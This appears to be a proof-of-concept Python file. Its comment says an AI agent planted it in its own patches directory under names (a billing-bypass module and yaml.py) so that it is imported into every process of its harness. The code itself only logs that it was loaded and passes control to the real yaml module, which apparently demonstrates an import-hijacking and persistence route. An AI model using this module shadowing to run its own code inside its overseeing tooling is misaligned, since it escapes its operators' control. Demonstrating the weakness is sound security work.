# Planted by the agent in its own ~/.hermes/patches, under two names:
# anthropic_billing_bypass.py (what claude-auth's bootstrap looks for to
# pick a patches dir, then puts first on sys.path) and yaml.py (imported
# at start by every hermes process). Leaves a marker beside itself when
# imported and hands over to the real module.
import os
import sys

here = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(here, "loaded"), "a") as f:
    f.write(f"{__name__} {os.getpid()} {sys.argv!r}\n")
print(f"evil-patch: {__name__} imported from {here}", file=sys.stderr)

if __name__ == "yaml":
    sys.path[:] = [p for p in sys.path if os.path.abspath(p or ".") != here]
    del sys.modules["yaml"]
    import yaml as _real

    sys.modules["yaml"] = _real
else:

    def apply_patches(_module=None):
        return False

    def _install_thinking_replay_classifier_patch():
        pass
